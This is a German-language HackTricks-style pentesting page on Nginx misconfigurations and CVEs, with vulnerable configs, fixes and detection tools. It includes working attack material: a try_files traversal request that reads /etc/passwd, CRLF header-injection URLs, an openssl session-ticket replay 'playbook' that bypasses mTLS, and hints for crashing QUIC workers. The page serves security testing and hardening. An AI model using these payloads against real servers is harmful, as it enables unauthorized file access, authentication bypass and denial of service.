# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Fehlende root location <a href="#missing-root-location" id="missing-root-location"></a>

Beim Konfigurieren des Nginx-Servers spielt die **root directive** eine entscheidende Rolle, da sie das Basisverzeichnis definiert, aus dem Dateien ausgeliefert werden. Betrachten Sie das folgende Beispiel:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
In dieser Konfiguration ist `/etc/nginx` als `root`-Verzeichnis festgelegt. Diese Einrichtung erlaubt den Zugriff auf Dateien innerhalb des angegebenen `root`-Verzeichnisses, wie z. B. `/hello.txt`. Es ist jedoch wichtig zu beachten, dass nur ein spezifischer `location` (`/hello.txt`) definiert ist. Es gibt keine Konfiguration für die Root-`location` (`location / {...}`). Diese Auslassung bedeutet, dass die `root`-Direktive global gilt und Anfragen an den Root-Pfad `/` den Zugriff auf Dateien unter `/etc/nginx` ermöglichen.

Ein kritischer Sicherheitsaspekt ergibt sich aus dieser Konfiguration. Eine einfache `GET`-Anfrage, wie `GET /nginx.conf`, könnte sensible Informationen offenlegen, indem sie die Nginx-Konfigurationsdatei unter `/etc/nginx/nginx.conf` ausliefert. Das Setzen des `root` auf ein weniger sensibles Verzeichnis, wie `/etc`, könnte dieses Risiko mindern, erlaubt jedoch weiterhin unbeabsichtigten Zugriff auf andere kritische Dateien, einschließlich weiterer Konfigurationsdateien, Access-Logs und sogar verschlüsselter Zugangsdaten, die für HTTP basic authentication verwendet werden.

## Alias LFI Fehlkonfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

In den Konfigurationsdateien von Nginx sollte den `location`-Direktiven besondere Aufmerksamkeit gewidmet werden. Eine Schwachstelle, bekannt als Local File Inclusion (LFI), kann unbeabsichtigt durch eine Konfiguration eingeführt werden, die wie folgt aussieht:
```
location /imgs {
alias /path/images/;
}
```
Diese Konfiguration ist anfällig für LFI-Angriffe, da der Server Anfragen wie `/imgs../flag.txt` als Versuch interpretiert, auf Dateien außerhalb des vorgesehenen Verzeichnisses zuzugreifen, und diese effektiv als `/path/images/../flag.txt` auflöst. Dieser Fehler ermöglicht es Angreifern, Dateien vom Dateisystem des Servers abzurufen, die über das Web nicht zugänglich sein sollten.

Um diese Schwachstelle zu beheben, sollte die Konfiguration wie folgt angepasst werden:
```
location /imgs/ {
alias /path/images/;
}
```
Weitere Infos: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Accunetix-Tests:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Unsichere Pfadbeschränkung <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Siehe die folgende Seite, um zu lernen, wie man Direktiven wie folgt bypassen kann:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Unsichere Verwendung von Variablen / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Verwundbare Variablen `$uri` und `$document_ur`i und dies kann behoben werden, indem man sie durch `$request_uri` ersetzt.
>
> Auch ein Regex kann verwundbar sein, zum Beispiel:
>
> `location ~ /docs/([^/])? { … $1 … }` - Verwundbar
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Nicht verwundbar (prüft auf Leerzeichen)
>
> `location ~ /docs/(.*)? { … $1 … }` - Nicht verwundbar

Eine Schwachstelle in der Nginx-Konfiguration wird am folgenden Beispiel demonstriert:
```
location / {
return 302 https://example.com$uri;
}
```
Die Zeichen \r (Carriage Return) und \n (Line Feed) kennzeichnen Zeilenumbruchzeichen in HTTP-Anfragen, und ihre URL-kodierten Formen werden als `%0d%0a` dargestellt. Das Einfügen dieser Zeichen in eine Anfrage (z. B. `http://localhost/%0d%0aDetectify:%20clrf`) an einen fehlkonfigurierten Server führt dazu, dass der Server einen neuen Header mit dem Namen `Detectify` ausgibt. Dies geschieht, weil die Variable $uri die URL-kodierten Zeilenumbruchzeichen dekodiert und so zu einem unerwarteten Header in der Antwort führt:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Erfahre mehr über die Risiken von CRLF injection und response splitting unter [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Diese Technik wird auch in [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) mit einigen verwundbaren Beispielen und Erkennungsmechanismen erklärt. Zum Beispiel: Um diese Fehlkonfiguration aus Blackbox-Perspektive zu erkennen, könnten Sie folgende Requests verwenden:

- `https://example.com/%20X` - beliebiger HTTP-Code
- `https://example.com/%20H` - 400 Bad Request

Wenn verwundbar, liefert die erste Antwort etwas zurück, da "X" jeder HTTP-Methode entspricht, und die zweite führt zu einem Fehler, weil "H" keine gültige Methode ist. Der Server würde also etwas wie: `GET / H HTTP/1.1` empfangen, was den Fehler auslöst.

Weitere Erkennungsbeispiele wären:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - beliebiger HTTP-Code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Einige in diesem Vortrag vorgestellte verwundbare Konfigurationen waren:

- Beachte, wie **`$uri`** im finalen URL unverändert gesetzt ist
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Beachte, wie erneut **`$uri`** in der URL vorkommt (dieses Mal innerhalb eines Parameters)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Jetzt in AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Beliebige Variable

Es wurde festgestellt, dass **vom Benutzer gelieferte Daten** unter bestimmten Umständen als **Nginx variable** behandelt werden können. Die Ursache für dieses Verhalten bleibt etwas rätselhaft; es ist jedoch weder selten noch einfach zu verifizieren. Diese Anomalie wurde in einem Sicherheitsbericht auf HackerOne hervorgehoben, der [here](https://hackerone.com/reports/370094) eingesehen werden kann. Weitere Untersuchungen der Fehlermeldung führten zur Identifizierung ihres Auftretens innerhalb des [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wobei Server Side Includes (SSI) als Ursache ausgemacht wurden.

Um **diese Fehlkonfiguration zu erkennen**, kann folgender Befehl ausgeführt werden, bei dem ein Referer-Header gesetzt wird, um die Ausgabe von Variablen zu testen:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Scans nach dieser Fehlkonfiguration auf verschiedenen Systemen zeigten mehrere Fälle, in denen Nginx-Variablen von einem Benutzer ausgegeben werden konnten. Ein Rückgang der Anzahl verwundbarer Instanzen deutet jedoch darauf hin, dass Maßnahmen zur Behebung dieses Problems teilweise erfolgreich waren.

### Verwendung von try_files mit $URI$ARGS-Variablen

Die folgende Nginx-Fehlkonfiguration kann zu einer LFI-Schwachstelle führen:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
In unserer Konfiguration haben wir die Direktive `try_files`, die verwendet wird, um in einer festgelegten Reihenfolge das Vorhandensein von Dateien zu prüfen. Nginx liefert die erste Datei aus, die gefunden wird. Die Grundsyntax der Direktive `try_files` lautet wie folgt:
```
try_files file1 file2 ... fileN fallback;
```
Nginx wird die Existenz jeder Datei in der angegebenen Reihenfolge prüfen. Wenn eine Datei existiert, wird sie sofort ausgeliefert. Wenn keine der angegebenen Dateien existiert, wird die Anfrage an die Fallback-Option weitergeleitet, die eine andere URI oder eine bestimmte Fehlerseite sein kann.

Wenn jedoch die Variablen `$uri$args` in dieser Direktive verwendet werden, versucht Nginx, nach einer Datei zu suchen, die mit der Request-URI kombiniert mit möglichen Query-String-Argumenten übereinstimmt. Daher können wir diese Konfiguration ausnutzen:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Mit folgendem payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Mit unserer payload entkommen wir dem Root-Verzeichnis (in der Nginx-Konfiguration definiert) und laden die Datei `/etc/passwd`. In den Debug-Logs können wir beobachten, wie Nginx die Dateien ausprobiert:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC gegen Nginx unter Verwendung der oben genannten Konfiguration:
![Beispiel burp-Anfrage](../../images/nginx_try_files.png)

## Rohes Auslesen der Backend-Antwort

Nginx bietet über `proxy_pass` eine Funktion, die das Abfangen von vom Backend erzeugten Fehlern und HTTP-Headern ermöglicht, mit dem Ziel, interne Fehlermeldungen und Header zu verbergen. Dies wird dadurch erreicht, dass Nginx bei Backend-Fehlern eigene Fehlerseiten ausliefert. Probleme treten jedoch auf, wenn Nginx auf eine ungültige HTTP-Anfrage trifft. Eine solche Anfrage wird unverändert an das Backend weitergeleitet, und die rohe Antwort des Backends wird dann ohne Eingreifen von Nginx direkt an den Client gesendet.

Betrachten wir ein Beispielszenario mit einer uWSGI-Anwendung:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Um dies zu verwalten, werden spezifische Direktiven in der Nginx-Konfiguration verwendet:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Diese Direktive erlaubt Nginx, eine benutzerdefinierte Antwort für Backend-Antworten mit einem Statuscode größer als 300 auszuliefern. Sie sorgt dafür, dass für unsere Beispiel-uWSGI-Anwendung eine `500 Error`-Antwort von Nginx abgefangen und behandelt wird.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Wie der Name schon sagt, blendet diese Direktive angegebene HTTP-Header gegenüber dem Client aus und erhöht damit Privatsphäre und Sicherheit.

Wenn eine gültige `GET`-Anfrage gestellt wird, verarbeitet Nginx sie normal und gibt eine standardmäßige Fehlerantwort zurück, ohne geheime Header zu offenbaren. Eine ungültige HTTP-Anfrage umgeht jedoch diesen Mechanismus, was zur Offenlegung roher Backend-Antworten führt, einschließlich geheimer Header und Fehlermeldungen.

## merge_slashes auf off

Standardmäßig ist die Nginx-**`merge_slashes`-Direktive** auf **`on`** gesetzt, wodurch mehrere Schrägstriche in einer URL zu einem einzigen zusammengefasst werden. Diese Funktion kann zwar die URL-Verarbeitung vereinfachen, aber unbeabsichtigt Schwachstellen in Anwendungen hinter Nginx verbergen, insbesondere solche, die für local file inclusion (LFI)-Angriffe anfällig sind. Die Sicherheitsexperten **Danny Robinson und Rotem Bar** haben auf die potenziellen Risiken dieses Standardverhaltens hingewiesen, besonders wenn Nginx als Reverse-Proxy fungiert.

Um solche Risiken zu mindern, wird empfohlen, die **`merge_slashes`-Direktive für anfällige Anwendungen auf `off` zu setzen**. Dadurch leitet Nginx Anfragen an die Anwendung weiter, ohne die URL-Struktur zu verändern, und verschleiert so keine zugrunde liegenden Sicherheitsprobleme.

Für weitere Informationen siehe [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Bösartige Antwort-Header**

Wie in [**diesem Writeup**](https://mizu.re/post/cors-playground) gezeigt, gibt es bestimmte Header, die, wenn sie in der Antwort des Webservers vorhanden sind, das Verhalten des Nginx-Proxys verändern. Sie können sie [**in der Dokumentation**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/) nachsehen:

- `X-Accel-Redirect`: Indicate Nginx to internally redirect a request to a specified location.
- `X-Accel-Buffering`: Controls whether Nginx should buffer the response or not.
- `X-Accel-Charset`: Sets the character set for the response when using X-Accel-Redirect.
- `X-Accel-Expires`: Sets the expiration time for the response when using X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Limits the rate of transfer for responses when using X-Accel-Redirect.

Beispielsweise verursacht der Header **`X-Accel-Redirect`** eine interne Weiterleitung in Nginx. Wenn also eine Nginx-Konfiguration etwa **`root /`** enthält und der Webserver in seiner Antwort **`X-Accel-Redirect: .env`** sendet, wird Nginx den Inhalt von **`/.env`** ausliefern (Path Traversal).

### **Standardwert in der `map`-Direktive**

In der **Nginx-Konfiguration** spielt die `map`-Direktive häufig eine Rolle bei der **Zugriffssteuerung**. Ein häufiger Fehler ist, keinen **default**-Wert anzugeben, was zu unautorisierten Zugriffen führen kann. Zum Beispiel:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Ohne ein `default` kann ein **bösartiger Benutzer** die Sicherheit umgehen, indem er eine **undefinierte URI** innerhalb von `/map-poc` aufruft. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) empfiehlt, einen **Standardwert** zu setzen, um solche Probleme zu vermeiden.

### **DNS Spoofing-Schwachstelle**

DNS Spoofing gegen Nginx ist unter bestimmten Bedingungen möglich. Wenn ein Angreifer den von Nginx verwendeten **DNS server** kennt und dessen DNS-Anfragen abfangen kann, kann er DNS-Einträge fälschen. Diese Methode ist jedoch wirkungslos, wenn Nginx so konfiguriert ist, dass für die DNS-Auflösung **localhost (127.0.0.1)** verwendet wird. Nginx erlaubt das Festlegen eines DNS-Servers wie folgt:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` und `internal` Direktiven**

Die **`proxy_pass`** Direktive wird verwendet, um Anfragen an andere Server weiterzuleiten, entweder intern oder extern. Die **`internal`** Direktive stellt sicher, dass bestimmte Locations nur innerhalb von Nginx zugänglich sind. Obwohl diese Direktiven an sich keine Schwachstellen darstellen, erfordert ihre Konfiguration eine sorgfältige Prüfung, um Sicherheitslücken zu vermeiden.

## proxy_set_header Upgrade & Connection

Wenn der nginx-Server so konfiguriert ist, dass er die Upgrade- und Connection-Header weiterreicht, könnte ein [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md) durchgeführt werden, um auf geschützte/interne Endpunkte zuzugreifen.

> [!CAUTION]
> Diese Schwachstelle würde einem Angreifer erlauben, eine direkte Verbindung mit dem `proxy_pass`-Endpunkt (`http://backend:9999` in diesem Fall) herzustellen, dessen Inhalt nicht von nginx überprüft wird.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Beachte, dass selbst wenn der `proxy_pass` auf einen bestimmten **path** wie `http://backend:9999/socket.io` zeigte, die Verbindung mit `http://backend:9999` hergestellt wird, sodass du **jeden anderen Pfad innerhalb dieses internen Endpunkts erreichen kannst. Es spielt also keine Rolle, ob ein Pfad in der URL von proxy_pass angegeben ist.**

## HTTP/3 QUIC module remote DoS & leak (2024)

Während 2024 veröffentlichte Nginx CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 und CVE-2024-35200, die zeigten, dass eine **einzige feindliche QUIC session** Worker-Prozesse abstürzen lassen oder memory leak verursachen kann, sofern das experimentelle `ngx_http_v3_module` kompiliert ist und ein `listen ... quic`-Socket exponiert wird. Betroffene Builds sind 1.25.0–1.25.5 und 1.26.0; 1.27.0/1.26.1 enthalten die Fixes. Die memory leak (CVE-2024-34161) erfordert zusätzlich MTUs größer als 4096 Bytes, damit sensitive Daten sichtbar werden (Details in der 2024 nginx advisory unten).

**Recon & exploitation hints**

- HTTP/3 ist opt-in, also scanne auf `Alt-Svc: h3=":443"`-Antworten oder brute-force UDP/443 QUIC handshakes; sobald bestätigt, fuzz die handshake- und STREAM-Frames mit custom `quiche-client`/`nghttp3` payloads, um Worker-Abstürze auszulösen und Log leakage zu erzwingen.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Umgehung der TLS-Session-Wiederaufnahme bei Client-Zertifikat-Authentifizierung (CVE-2025-23419)

Eine Advisory vom Februar 2025 veröffentlichte, dass nginx 1.11.4–1.27.3, gebaut mit OpenSSL, das **Wiederverwenden einer TLS-1.3-Sitzung** von einem namensbasierten Virtual Host innerhalb eines anderen erlaubt. Dadurch kann ein Client, der mit einem zertifikatsfreien Host ausgehandelt hat, das Ticket/PSK erneut abspielen, um in einen vhost zu springen, der mit `ssl_verify_client on;` geschützt ist, und mTLS vollständig umgehen. Der Bug tritt auf, wann immer mehrere virtual hosts denselben TLS-1.3-Session-Cache und dieselben Tickets teilen (siehe das nginx-Advisory von 2025 weiter unten).

**Angreifer-Playbook**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Wenn das Ziel verwundbar ist, wird das zweite Handshake ohne Vorlage eines Client-Zertifikats abgeschlossen und geschützte Bereiche offengelegt.

**Was zu prüfen ist**

- Gemischte `server_name`-Blöcke, die `ssl_session_cache shared:SSL` sowie `ssl_session_tickets on;` gemeinsam nutzen.
- Admin/API-Blöcke, die mTLS erwarten, aber gemeinsame Session-Cache/-Ticket-Einstellungen von öffentlichen Hosts erben.
- Automation, die TLS 1.3 Sitzungswiederaufnahme global aktiviert (z. B. Ansible-Rollen), ohne vhost-Isolierung zu berücksichtigen.

## HTTP/2 Rapid Reset Resilienz (CVE-2023-44487 Verhalten)

Der HTTP/2 Rapid Reset-Angriff (CVE-2023-44487) betrifft nginx weiterhin, wenn Betreiber `keepalive_requests` oder `http2_max_concurrent_streams` über die Standardeinstellungen hinaus erhöhen: Ein Angreifer öffnet eine HTTP/2-Verbindung, flutet sie mit Tausenden von Streams und sendet dann unmittelbar `RST_STREAM`-Frames, sodass die Grenze für gleichzeitige Streams nie erreicht wird, während die CPU weiter an der Tear-down-Logik arbeitet. Die nginx-Standardeinstellungen (128 concurrent streams, 1000 keepalive requests) halten den Blast-Radius klein; das erhebliche Erhöhen dieser Limits macht es trivial, Worker selbst von einem einzelnen Client aus auszuhungern (siehe das unten referenzierte F5 write-up).

**Erkennungstipps**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosts that reveal unusually high values for those directives are prime targets: one HTTP/2 client can loop through stream creation and instant `RST_STREAM` frames to keep CPU pegged without tripping the concurrency cap.

## Probieren Sie es selbst

Detectify hat ein GitHub-Repository erstellt, in dem Sie Docker verwenden können, um Ihren eigenen verwundbaren Nginx-Testserver mit einigen der in diesem Artikel behandelten Fehlkonfigurationen einzurichten und diese selbst zu finden!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Statische Analyse-Tools

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (ein aktualisierter Fork von GIXY) ist ein Tool zur Analyse von Nginx-Konfigurationen mit dem Ziel, Sicherheitslücken, unsichere Direktiven und riskante Fehlkonfigurationen zu finden. Es erkennt auch Fehlkonfigurationen, die die Performance beeinträchtigen, und entdeckt verpasste Härtungsmaßnahmen, wodurch eine automatisierte Fehlererkennung ermöglicht wird.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner ist ein einfaches Tool, um nach häufigen Nginx-Fehlkonfigurationen und Sicherheitslücken zu suchen.

## Referenzen

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
